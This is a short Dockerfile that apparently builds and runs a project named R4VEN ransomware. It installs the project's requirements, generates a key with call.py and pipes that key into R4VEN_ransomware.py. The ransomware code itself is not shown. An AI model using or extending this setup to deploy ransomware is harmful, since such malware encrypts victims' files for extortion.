FROM python
WORKDIR R4VENRANSOMWARE
LABEL autor="https://github.com/Mostela"
COPY . .
RUN pip install -r requirements.txt && python call.py > hash.key
RUN cat hash.key | python R4VEN_ransomware.py